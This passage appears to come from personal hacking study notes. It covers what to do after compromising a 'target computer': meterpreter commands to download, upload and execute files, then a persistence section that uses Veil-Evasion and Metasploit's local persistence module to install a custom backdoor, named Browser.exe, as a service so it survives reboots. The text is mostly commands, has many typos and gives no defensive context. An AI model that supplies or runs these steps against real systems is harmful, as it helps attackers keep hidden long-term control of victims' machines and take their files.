After gaining access to the target computer we can \
->dowload any of the file from target computer to our computer using " download [file_name] "
-?upload a particular file into the target computer'upload [file_name] "
-> execute the uploaded file in the target computer " execute -f [file_name] "

05. Maintaining Access (Persistence)

Whenver the target user switches off their computer,our backdoor also gets terminated.Hence , we need to run our backdoor as a service so that it gets turned on whenevr the target system is also turned on
This can be done by veil-evasion ->> list ->> use (service_no)5
else

backgrond current session 
use exploit/windoes/local/persistence 
show options
set EXE_NAME Browser.exe
set SESSION 1
show advanced options 
set EXE::custom /var/www/html/backdoor.exe (run a custom exe to run and imject into the target as a service)
exploit
